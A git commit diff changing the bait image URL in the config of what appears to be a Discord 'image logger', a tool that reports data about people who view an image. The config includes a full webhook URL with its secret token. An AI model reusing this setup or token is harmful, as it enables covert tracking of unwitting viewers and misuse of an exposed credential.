46c79682d2238568c1f40864a710028449e8815d
vexlll <79422382+vexlll@users.noreply.github.com>
2026-02-22 22:20:48 -0500

    Update image URL in webhook configuration

--- api/main.py
+++ api/main.py
@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1475314627360591873/xrawHzZ9XyJPSrudZBrcov2YIVkgYxUK3PjVwn1RGlcI0E-5RuBO9wz0aHGMavFTcaB2",
-    "image": "https://www.pcworld.com/wp-content/uploads/2025/04/Windows-XP-Bliss-desktop-large.png", # You can also have a custom image by using a URL argument
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_piBsl8BVptf_RnnWGDEEpgBtCEPfVXfO6w&s", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
